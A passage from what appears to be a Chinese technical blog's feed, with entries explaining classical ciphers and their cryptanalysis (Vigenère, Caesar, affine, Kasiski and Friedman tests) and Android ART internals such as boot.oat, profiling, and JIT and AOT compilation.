范围内的，也验证了我们的猜测。于是：<br>23-x</p><p>73-m</p><p>12-a</p><p>63-n</p><p>11-q</p></blockquote></li></ol><p>不对呀，密码格式是 xman{，第四个字符是 {，于是看了看 { 的位置，其并没有对应的横坐标，但是如果我们手动把它视为 11 的话，那么 111 就是 {。然后依次往后推，发现确实可行，，最后再把 121 视为 } 即可得到 flag.</p><blockquote><p>xman{hintisenough}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 古典密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他类型密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码学基础二</title>
      <link href="/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%8C/"/>
      <url>/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="多表代换密码"><a href="#多表代换密码" class="headerlink" title="多表代换密码"></a>多表代换密码</h3><p>对于多表替换加密来说，加密后的字母几乎不再保持原来的频率，所以我们一般只能通过寻找算法实现对应的弱点进行破解。</p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>维吉尼亚密码是广为人知的多表替换式密码，也称为多字母替换式密码。</p><p>在一个凯撒密码中，字母表中的每一字母都会作一定的偏移，例如偏移量为3时，A就转换为了D、B转换为了E……而维吉尼亚密码则是由一些偏移量不同的恺撒密码组成。</p><p>为了生成密码，需要使用表格法。这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p><p>例如：</p><p>假设明文是ATTACKATDAWN，选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：LEMONLEMONLE</p><p>对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：</p><p>明文：ATTACKATDAWN<br>密钥：LEMONLEMONLE<br>密文：LXFOPVEFRNHR</p><p>解密的过程则与加密相反。例如：根据密钥第一个字母L所对应的L行字母表，发现密文第一个字母L位于A列，因而明文第一个字母为A。密钥第二个字母E对应E行字母表，而密文第二个字母X位于此行T列，因而明文第二个字母为T。以此类推便可得到明文。</p><p>用数字0-25代替字母A-Z，维吉尼亚密码的加密文法可以写成同余的形式：</p><p>$C_i$=$P_i$+$K_i(mod\ 26)$</p><p>解密方法则能写成：</p><p>$P_i$=$C_i$-$K_i(mod\ 26)$</p>]]></content>
      
      
      <categories>
          
          <category> 古典密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多表代换密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码学基础一</title>
      <link href="/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>古典密码学是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，或者两者的混合。其与历史中经常使用，但现代已经很少使用，大部分已经不再使用。在古典密码学中，设计者主要考虑消息的保密性，使得只有相关密钥的人才可以解密密文获得消息的内容，对于消息的完整性和不可否认性则并没有进行太多的考虑。<br>。</p><h2 id="密码分类"><a href="#密码分类" class="headerlink" title="密码分类"></a>密码分类</h2><h3 id="单表代换密码"><a href="#单表代换密码" class="headerlink" title="单表代换密码"></a>单表代换密码</h3><p>对字母做系统的替换，直到讯息被替换为难以理解的字。</p><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>凯撒密码是广为人知的单表式替换密码，它只使用一个密码字母集。</p><p>为了使用凯撒密码加密讯息，每个密码字母集中字母将会被其位置的后三个字母替代。因此字母A將会被字母D替代、字母B將会被字母E替代、字母C將会被字母F替代等，最后，X、Y和Z將分別的被替代成A、B和C。例如，”WIKIPEDIA”將被加密成”ZLNLSHGLD”。凱撒把字母向后移”3”位，但其他数字也是类似。</p><p>根据偏移量的不同，还存在若干特定的恺撒密码名称：</p><ul><li>偏移量为 10：Avocat （A→K）</li><li>偏移量为 13：ROT13</li><li>偏移量为 -5：Cassis （K 6）</li><li>偏移量为 -6：Cassette （K 7）</li></ul><p>另一种替换式密码是使用关键字（等同于密钥），你可以选择一个字母或片段并去除所有的空格和重复字母，接着把它当做密码字母集的开头，把去除密钥后的其他字母接续排序。例如，如果关键字是cipher，则密码字母表会是下面的情况：</p><p>一般密码字母集: a b c d e f g h i j k l m n o p q r s t u v w x y z</p><p>密钥密码字母集: c i p h e r s t u v w x y z a b d f g j k l m n o q</p><p>还有一种基于密钥的凯撒密码，其基本原理是利用一个密钥，将密钥的每一位转换为数字（一般转化为字母表对应顺序的数字），分别以这一数字为密钥加密明文的每一位字母。例如：<br>密文：s0a6u3u1s0bv1a<br>密钥：guangtou<br>偏移：6,20,0,13,6,19,14,20<br>明文：y0u6u3h1y0uj1u  </p><p>对于不带密钥的凯撒密码来说，破解方式有两种：  </p><ul><li>遍历 26 个偏移量，适用于普遍情况。</li><li>在密文长度足够长的时候，使用词频分析<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></li></ul><p>其中，第一种方式肯定可以得到明文，而第二种方式则不一定可以得到正确的明文。</p><p>而对于基于密钥的凯撒密码来说，一般来说必须知道对应的密钥。</p><p>工具：<br>一般我们有如下的工具，其中 JPK 比较通用。</p><ul><li>JPK，可解带密钥与不带密钥</li><li><a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">http://planetcalc.com/1434/</a></li><li><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></li></ul><h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><p>简单替换密码（Simple Substitution Cipher）加密时，将每个明文字母替换为与之唯一对应且不同的字母。它与恺撒密码之间的区别是其密码字母表的字母不是简单的移位，而是完全是混乱的，这也使得其破解难度要高于凯撒密码。 比如：<br>明文字母 : abcdefghijklmnopqrstuvwxyz<br>密钥字母 : phqgiumeaylnofdxjkrcvstzwb<br>a 对应 p，d 对应 h，以此类推。<br>明文：the quick brown fox jumps over the lazy dog<br>密文：cei jvaql hkdtf udz yvoxr dsik cei npbw gdm<br>而解密时，我们一般是知道了每一个字母的对应规则，才可以正常解密。</p><p>由于这种加密方式导致其所有的密钥个数是26!，所以几乎上不可能使用暴力的解决方式。所以我们 一般采用词频分析。</p><p>工具：<a href="http://quipqiup.com/" target="_blank" rel="noopener">http://quipqiup.com/</a></p><h3 id="移位式密码"><a href="#移位式密码" class="headerlink" title="移位式密码"></a>移位式密码</h3><p>与凯撒密码类似，区别在于移位密码不仅会处理字母，还会处理数字和特殊字符，常用 ASCII 码表进行移位。其破解方法也是遍历所有的可能性来得到可能的结果。</p><h4 id="纵线式移位密码"><a href="#纵线式移位密码" class="headerlink" title="纵线式移位密码"></a>纵线式移位密码</h4><p>一个移位式密码的具体例子就是纵线式移位密码。先选择一个关键字，把原来的讯息由左向右、由上到下依照关键字长度转写成长方形。接着把关键字的字母依照字母集顺序编号，例如a就是1，b就是2，c就是3等。例如：关键字是CAT，明文是THE SKY IS BLUE，则讯息应该被转换成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C A T  </span><br><span class="line">3 1 20  </span><br><span class="line">T H E  </span><br><span class="line">S K Y  </span><br><span class="line">I S B  </span><br><span class="line">L U E</span><br></pre></td></tr></table></figure></p><p> 最后把讯息以行为单位，依照编号大小调换位置，呈现的应该是 A为第一行，C为第二行，T为第三行。然后就可以把讯息转换成HKSUTSILEYBE</p><h4 id="中国式密码"><a href="#中国式密码" class="headerlink" title="中国式密码"></a>中国式密码</h4><p> 另外一种移位式密码是中国式密码，移位的方法是将讯息的字母加密成由右向左、上下交替的不规则的字母。例如，如果明文是THE DOG RAN FAR，则中国式密码看起来像这样：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R  R   G   T</span><br><span class="line">A  A   O   H</span><br><span class="line">F  N   D   E</span><br></pre></td></tr></table></figure></p><p> 密文将被是：RRGT AAOH FNDE</p><h4 id="艾特巴什码"><a href="#艾特巴什码" class="headerlink" title="艾特巴什码"></a>艾特巴什码</h4><p>埃特巴什码（Atbash Cipher）其实可以视为下面要介绍的简单替换密码的特例，它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。在罗马字母表中，它是这样出现的：<br>明文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A<br>下面给出一个例子：<br>明文：the quick brown fox jumps over the lazy dog<br>密文：gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</p><p>可以看出其密钥空间足够短，同时当密文足够长时，仍然可以采用词频分析的方法解决。</p><p>工具：<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</a></p><h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><p>原理：<br>仿射密码的加密函数是<br>E(x)=(ax+b)(mod m)，其中：  </p><ul><li>x表示明文按照某种编码得到的数字</li><li>a和m互质</li><li>m是编码系统中字母的数目。</li></ul><p>解密函数是D(x)=$a^{-1}$(x-b)(mod m),其中$a^{-1}$是a在整数群的乘法逆元。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">明文:A F F I N  E C I P H E R </span><br><span class="line">x:  0 5 5 8 13 4 2 8 15 7 4 17</span><br><span class="line">y=5x+8:8 33 33 48 73 28 18 48 83 43 28 93</span><br><span class="line">y mod 26:8 7 7 22 21 2 18 22 5 17 2 15 </span><br><span class="line">密文:I H H W V C S W F R C P</span><br></pre></td></tr></table></figure></p><p>其对应的加密结果是 IHHWVCSWFRCP。</p><p>对于解密过程，正常解密者具有 a 与 b，可以计算得到$a^{-1}$为 21，所以其解密函数是:D(x)=21(x-8)(mod 26)</p><p>破解：<br>首先，我们可以看到的是，仿射密码对于任意两个不同的字母，其最后得到的密文必然不一样，所以其也具有最通用的特点。当密文长度足够长时，我们可以使用频率分析的方法来解决。</p><p>其次，我们可以考虑如何攻击该密码。可以看出当a=1时，仿射加密是凯撒加密。而一般来说，我们利用仿射密码时，其字符集都用的是字母表，一般只有 26 个字母，而不大于 26 的与 26 互素的个数一共有ϕ(26）=ϕ(2)Xϕ(13)=12,算上 b 的偏移可能，一共有可能的密钥空间大小也就是12×26=312 </p><p>一般来说，对于该种密码，我们至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。</p><p>这种密码由两种参数来控制，如果我们知道其中任意一个参数，那我们便可以很容易地快速枚举另外一个参数得到答案。</p><p>但是，假设我们已经知道采用的字母集，这里假设为 26 个字母，我们还有另外一种解密方式，我们只需要知道两个加密后的字母$y_1$,$y_2$即可进行解密。那么我们还可以知道:<br>$y_1$=(a$x_1$+b)(mod 26)<br>$y_2$=(a$x_2$+b)(mod 26)<br>二者相减,可得：<br>$y_1$-$y_2$=a($x_1$-$x_2$)(mod 26)</p><p>这里$y_1$,$y_2$已知，如果我们知道密文对应的两个不一样的字符$x_1$,$x_2$，那么我们就可以很容易得到 a，进而就可以得到 b了。</p><h2 id="密码破译"><a href="#密码破译" class="headerlink" title="密码破译"></a>密码破译</h2><p> 经典密码通常很容易被破解。许多经典密码可单由密文而破解，所以它们容易遭受到唯密文攻击法攻击。有些经典密码（例如凯撒密码）的密钥个数有限，所以这类密码可以通过暴力破解尝试所有的密钥。替换式密码有较大的密钥数，但是很容易被频率分析，因为每个密码字母各代替了一个明文字母。多表式替换密码使用多个替换可防止简单的频率分析，但卡西斯基验、弗里德曼试验可用来破解这类密码。</p><h3 id="卡西斯基试验"><a href="#卡西斯基试验" class="headerlink" title="卡西斯基试验"></a>卡西斯基试验</h3><p> 卡西斯基试验是基于类似the这样的常用单词有可能被同样的密钥字母进行加密，从而在密文中重复出现。例如，明文中不同的CRYPTO可能被密钥ABCDEF加密成不同的密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密钥：ABCDEF AB CDEFA BCD EFABCDEFABCD</span><br><span class="line">明文：CRYPTO IS SHORT FOR CRYPTOGRAPHY</span><br><span class="line">密文：CSASXT IT UKSWT GQU GWYQVRKWAQJB</span><br></pre></td></tr></table></figure></p><p>此时明文中重复的元素在密文中并不重复。然而，如果密钥相同的话，结果可能便为（使用密钥ABCD）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密钥：ABCDAB CD ABCDA BCD ABCDABCDABCD</span><br><span class="line">明文：CRYPTO IS SHORT FOR CRYPTOGRAPHY</span><br><span class="line">密文：CSASTP KV SIQUT GQU CSASTPIUAQJB</span><br></pre></td></tr></table></figure></p><p>此时卡西斯基试验就能产生效果。对于更长的段落此方法更为有效，因为通常密文中重复的片段会更多。如通过下面的密文就能破译出密钥的长度：<br>密文：<strong>DYDUXRMH</strong>TVDV<strong>NQD</strong>QNW<strong>DYDUXRMH</strong>ARTJGW<strong>NQD</strong></p><p>其中，两个DYDUXRMH的出现相隔了18个字母。因此，可以假定密钥的长度是18的约数，即长度为18、9、6、3或2。而两个NQD则相距20个字母，意味着密钥长度应为20、10、5、4或2。取两者的交集，则可以基本确定密钥长度为2。</p><h3 id="弗里德曼试验"><a href="#弗里德曼试验" class="headerlink" title="弗里德曼试验"></a>弗里德曼试验</h3><p>它使用了重合指数（index of coincidence）来描述密文字母频率的不匀性，从而破译密码。$k_p$指目标语言中两个任意字母相同的概率（英文中为0.067），$k_r$指字母表中这种情况出现的概率（英文中为1/26=0.0385），从而密钥长度可以估计为：  </p><p>分子 = $k_p$-$k_r$</p><p>分母 = $k_o$-$k_r$</p><p>密钥长度 = $\frac{分子}{分母}$</p><p>此方法只是一种估计，会随着文本长度的增加而更为精确。在实践中，会尝试接近此估计的多个密钥长度。一种更好的方法是将密文写成矩阵形式，其中列数与假定的密钥长度一致，将每一列的重合指数单独计算，并求得平均重合指数。对于所有可能的密钥长度，平均重合指数最高的最有可能是真正的密钥长度。这样的试验可以作为卡西斯基试验的补充。</p><h3 id="频率分析"><a href="#频率分析" class="headerlink" title="频率分析"></a>频率分析</h3><p>一旦能够确定密钥的长度，密文就能重新写成多列，列数与密钥长度对应。这样每一列其实就是一个凯撒密码，而此密码的密钥（偏移量）则对应于维吉尼亚密码密钥的相应字母。与破译凯撒密码类似的方法，就能将密文破译。</p><p>柯克霍夫方法作为卡西斯基试验的改进，由奥古斯特·柯克霍夫（Auguste Kerckhoffs）提出。它将每一列的字母频率与转换后的明文频率相对应而得出每一列的密钥字母。一旦密钥中每一个字母都能确定，就能很简单地破译密文，从而得到明文。如果维吉尼亚字母表表格本身是杂乱而非按通常字母表顺序的话，那柯克霍夫方法就会无效，但卡西斯基试验和重复指数对于决定密钥长度仍旧是有效的。</p>]]></content>
      
      
      <categories>
          
          <category> 古典密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单表代换密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android中的编译器</title>
      <link href="/2019/01/02/Android%E7%BC%96%E8%AF%91%E5%99%A8%E7%9B%B8%E5%85%B3/"/>
      <url>/2019/01/02/Android%E7%BC%96%E8%AF%91%E5%99%A8%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>MIR -&gt; LIR -&gt; native code</p><p>SSA：（编译器后端寄存器分配算法，static single assignment）静态单一复制法，是一种中间表示形式。<br>之所以称之为单赋值，是因为每个名字在SSA中仅被赋值一次。</p><p>在某种程度上，可以认为MIR即为对dalvik指令进行SSA变换之后的指令形态。</p><p>接着就调用cu.cg-&gt;Materialize()用来产生最终代码，其中重要的两个调用就是MethodMIR2LIR()和AssembleLIR()。<br>通MethodMIR2LIR()将MIR转化为LIR，遍历每个BasicBlock，对每个基本块执行MethodBlockCodeGen，<br>本质上最后是执行了CompileDalvikInstruction。CompileDalvikInstruction也就是通过解析指令，然后根据opcode进行分支判断，<br>调用最终不同的指令生成函数，最后LIR之间也形成一个双向链表。最终将MIR转换为LIR。</p><p>AssembleLIR()最终调用的是AssembleInstructions函数。程序中维护了一个编码指令表MipsMir2Lir::EncodingMap，<br>AssembleInstructions即是通过查找这个表来进行翻译，将LIR转化为了MIPS指令，<br>并将所翻译的指令存储到CodeBufferMir2Lir::code_buffer_之中。<br>这样就完成了一次编译的完整流程。</p><p>总结：<br>MIR为对dalvik指令进行SSA变换之后的指令形态。<br>LIR为对MIR形态的指令进行解析生成的另一种形态的指令。<br>native code为通过查找编码指令表将LIR形态的指令翻译为对应不同平台的汇编指令。</p>]]></content>
      
      
      <categories>
          
          <category> 编译器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIR </tag>
            
            <tag> LIR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 逐步认识ART系列二</title>
      <link href="/2018/12/28/Android-%E9%80%90%E6%AD%A5%E8%AE%A4%E8%AF%86ART%E7%B3%BB%E5%88%97%E4%BA%8C/"/>
      <url>/2018/12/28/Android-%E9%80%90%E6%AD%A5%E8%AE%A4%E8%AF%86ART%E7%B3%BB%E5%88%97%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="boot-oat"><a href="#boot-oat" class="headerlink" title="boot.oat"></a>boot.oat</h1><ul><li>Contains libs and frameworks in boot class path<br>  – To be pre-loaded in all apps（系统启动路径下的的需要预加载库和框架）</li></ul><p>任何应用程序都不是孤立存在的，几乎所有应用程序都会依赖Android Framework中提供的基础类，例如Activity，Intent，Parcel等类。所以在应用程序的代码中，自然少不了对于这些类的引用.</p><p>考虑到几乎所有应用都存在这种引用关系，在运行时都会依赖于Framework中的类，因此系统如何处理这部分逻辑就是非常重要的了，因为这个处理的方法将影响到所有应用程序。</p><p>在AOSP编译时，会将所有这些公共类放到专门的一个Oat文件中，这个文件就是：boot.oat。与之配合的还有一个boot.art文件。</p><p>boot.oat可以在两个地方找到：</p><ol><li><p>/system/framework/[platform]/boot.oat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/system/framework/arm # ls -l</span><br><span class="line">-rw-r--r-- root     root     50767704 2014-11-20 19:07 boot.oat</span><br></pre></td></tr></table></figure></li><li><p>/data/dalvik-cache/[platform]/system@<a href="mailto:framework@boot.oat" target="_blank" rel="noopener">framework@boot.oat</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/data/dalvik-cache/arm # ls -l</span><br><span class="line">-rw-r--r-- root     root     51003824 1970-05-29 01:45 system@framework@boot.oat</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/system/bin/dex2oat --image=/data/dalvik-cache/system@framework@boot.art --runtime-arg</span><br><span class="line">-Xms64m --runtime-arg -Xmx64m --dex-file=/system/framework/core-libart.jar --dex-file=/</span><br><span class="line">system/framework/conscrypt.jar --dex-file=/system/framework/okhttp.jar --dex-file=/</span><br><span class="line">system/framework/core-junit.jar --dex-file=/system/framework/bouncycastle.jar --dexfile=/system/framework/ext.jar --dex-file=/system/framework/framework.jar --dex-file=/</span><br><span class="line">system/framework/framework2.jar --dex-file=/system/framework/telephony-common.jar --</span><br><span class="line">dex-file=/system/framework/voip-common.jar --dex-file=/system/framework/mms-common.jar</span><br><span class="line">--dex-file=/system/framework/android.policy.jar --dex-file=/system/framework/</span><br><span class="line">services.jar --dex-file=/system/framework/apache-xml.jar --dex-file=/system/framework/</span><br><span class="line">webviewchromium.jar --oat-file=/data/dalvik-cache/system@framework@boot.oat --runtimearg -implicit-checks:none --instruction-set=arm --instruction-set-features=default --</span><br><span class="line">base=0x70000000 --image-classes-zip=/system/framework/framework.jar</span><br></pre></td></tr></table></figure><p><strong>上面命令编译进boot.oat中的jar:</strong><br>/system/framework/core-libart.jar<br>/system/framework/conscrypt.jar<br>/system/framework/okhQp.jar<br>/system/framework/core-junit.jar<br>/system/framework/bouncycastle.jar<br>/system/framework/ext.jar<br>/system/framework/framework.jar<br>/system/framework/framework2.jar<br>/system/framework/telephony-common.jar<br>/system/framework/voip-common.jar<br>/system/framework/mms-common.jar<br>/system/framework/android.policy.jar<br>/system/framework/services.jar<br>/system/framework/apache-xml.jar<br>/system/framework/webviewchromium.jar  </p><h1 id="boot-art-boot-image"><a href="#boot-art-boot-image" class="headerlink" title="boot.art(boot image)"></a>boot.art(boot image)</h1><ul><li>contains absolute pointers for methods in boot.oat(以绝对地址指向boot.oat中的方法)</li><li>boot.art和boot.oat的加载地址都是32位，在64位的系统上，高32位都是0</li></ul><p>boot.art中包含了指向boot.oat中方法代码的指针，它被称之为启动镜像（Boot Image），并且被加载的位置是固定的。boot.oat被加载的地址紧随着boot.art。</p><p>boot.art可以在两个地方找到：</p><ol><li><p>/system/framework/[platform]/boot.art</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/system/framework/arm # ls -l</span><br><span class="line">-rw-r--r-- root     root     11829248 2014-11-20 19:07 boot.art</span><br></pre></td></tr></table></figure></li><li><p>/data/dalvik-cache/[platform]/system@<a href="mailto:framework@boot.art" target="_blank" rel="noopener">framework@boot.art</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/data/dalvik-cache/arm # ls -l</span><br><span class="line">-rw-r--r-- root     root     11829248 1970-05-29 01:45 system@framework@boot.art</span><br></pre></td></tr></table></figure></li></ol><h1 id="Profiling"><a href="#Profiling" class="headerlink" title="Profiling"></a>Profiling</h1><ul><li>By default,ART compiles methods regardless of impact on performance(ART编译方法时，不会考虑对性能的影响)</li><li>Profiling feature allows ART to be more selective on which methods to compile(profile能够控制dex2oat具体要对哪些方法进行编译优化)</li><li>Profiling配置默认可能是关闭的。可以通过setprop手动打开</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setprop dalvik.vm.profiler 1</span><br></pre></td></tr></table></figure><p>- No AOT compilation upon app install(在App安装时不会进行AOT优化，一方面时为了减少安装时间、另一方面时节省存储空间)</p><ul><li>Profiling data is collected while app is runing(在App运行期间，会收集profile数据)</li><li>Profile files are placed in /data/dalvik-cache/profiles</li><li>Profile file name is the package name</li><li>Profile data is used to determine if AOT compilation will be done</li></ul><p>example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">42/2/352  </span><br><span class="line">android.database.Cursor com.android.email.provider.EmailProvider.uiAccounts(java.lang.String[])/1/128  </span><br><span class="line">void com.android.email.NotificationController.ensureHandlerExists()/1/37</span><br><span class="line">int com.android.email.provider.EmailProvider.getFolderTypeFromMailboxType(int)/2/56</span><br><span class="line">boolean com.android.mail.browse.ConversationCursor$ConversationProvider.onCreate()/1/49</span><br><span class="line">com.google.common.collect.ImmutableList com.google.common.collect.ImmutableList.of()/1/3</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></p><ul><li>First line is the summary inforamtion<blockquote><p>count/Null methods count/Boot path methods count</p></blockquote></li><li>Subsequent lines are the profile data<blockquote><p>Methods name/Count/Size</p></blockquote></li></ul><h1 id="App-Image"><a href="#App-Image" class="headerlink" title="App Image"></a>App Image</h1><ul><li>/data/app/xxx/oat/arm/base.art</li><li>/data/app/xxx/oat/rm/base.odex</li></ul><p>base.art 就是对应的App image文件。主要记录已经编译好的类的具体信息以及函数在oat文件的位置，相当于缓存，在app运行的时候会加载到虚拟机，可以加快启动速度。</p><p><strong>在Android7.0上，dex2oat的参数 compiler-filter被指定为profile类型的几个compiler-filter之一时，dex2oat还会生成app-image文件。</strong></p>]]></content>
      
      
      <categories>
          
          <category> ART虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> boot.oat </tag>
            
            <tag> boot.art </tag>
            
            <tag> Profile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逐步认识ART系列一</title>
      <link href="/2018/12/27/Android-%E9%80%90%E6%AD%A5%E8%AE%A4%E8%AF%86ART%E7%B3%BB%E5%88%97%E4%B8%80/"/>
      <url>/2018/12/27/Android-%E9%80%90%E6%AD%A5%E8%AE%A4%E8%AF%86ART%E7%B3%BB%E5%88%97%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>参考资料：<br>原文：<a href="https://blog.csdn.net/hl09083253cy/article/details/78418809" target="_blank" rel="noopener">https://blog.csdn.net/hl09083253cy/article/details/78418809</a><br>原文：<a href="https://paul.pub/android-art-vm/#id-art-vs-dalvik" target="_blank" rel="noopener">https://paul.pub/android-art-vm/#id-art-vs-dalvik</a><br>Android Source：<a href="https://source.android.com.devices/tech/dalvik/configure" target="_blank" rel="noopener">https://source.android.com.devices/tech/dalvik/configure</a>  </p><h1 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h1><p>我们知道，C/C++的效率要比 Java好，因为C/C++会被直接编译成汇编指令，CPU可以直接读取运行；而Java却是需要虚拟机一步一步的解释每一条 java bytecode。</p><p>而Dalvik 中使用了一个技术，叫做JIT，会在解释执行一个java方法或者一个java代码段时，进行trace，并在不断的执行过程中找到 hotspot，</p><p>然后将相应的方法或者代码片段编译为对应的汇编指令，下次再执行到该方法时，会直接执行其对应的汇编指令，依次来提升部分效率。</p><p>可以理解为：运行时追踪，并对hotspot进行编译生成高效的可执行指令。</p><p>JIT的运行流程</p><ol><li>用户运行应用，而这随后就会触发 ART 加载 .dex 文件。<ol><li>如果有 .oat 文件（即 .dex 文件的 AOT 二进制文件），则 ART 会直接使用该文件。虽然 .oat 文件会定期生成，但文件中不一定会包含经过编译的代码（即 AOT 二进制文件）。</li><li>如果没有 .oat 文件，则 ART 会通过 JIT 或解释器执行 .dex 文件。如果有 .oat 文件，ART 将一律使用这类文件。否则，它将在内存中使用并解压 APK 文件，从而得到 .dex 文件，但是这会导致消耗大量内存（相当于 dex 文件的大小）。</li></ol></li><li>针对任何未根据speed编译过滤器编译（见下文）的应用启用JIT（也就是说，要尽可能多地编译应用中的代码）。</li><li>将 JIT 配置文件数据转存到只限应用访问的系统目录内的文件中。</li><li>AOT 编译 dex2oat 守护进程通过解析该文件来推进其编译。</li></ol><p>要开启 JIT 日志记录，请运行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell stop</span><br><span class="line">adb shell setprop dalvik.vm.extra-opts -verbose:jit</span><br><span class="line">adb shell start</span><br></pre></td></tr></table></figure><p>要停用 JIT，请运行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell stop</span><br><span class="line">adb shell setprop dalvik.vm.usejit false</span><br><span class="line">adb shell start</span><br></pre></td></tr></table></figure><h1 id="AOT"><a href="#AOT" class="headerlink" title="AOT"></a>AOT</h1><p>Ahead-of-time（AOT）是相对于Just-in-time（JIT）而言的。JIT是在运行时进行字节码到本地机器码的编译，这也是为什么Java普遍被认为效率比C++差的原因。无论是解释器的解释还是运行过程中即时编译，都比C++编译出的本地机器码执行多了一个耗费时间的过程。而AOT就是向C++编译过程靠拢的一项技术：当APK在安装的时候，系统会通过一个名称为dex2oat的工具将APK中的dex文件编译成包含本地机器码的oat文件存放下来。这样做之后，在程序执行的时候，就可以直接使用已经编译好的机器码以加快效率。</p><h1 id="单纯的JIT存在的问题"><a href="#单纯的JIT存在的问题" class="headerlink" title="单纯的JIT存在的问题"></a>单纯的JIT存在的问题</h1><ol><li>执行效率差</li></ol><h1 id="单纯的AOT存在的问题"><a 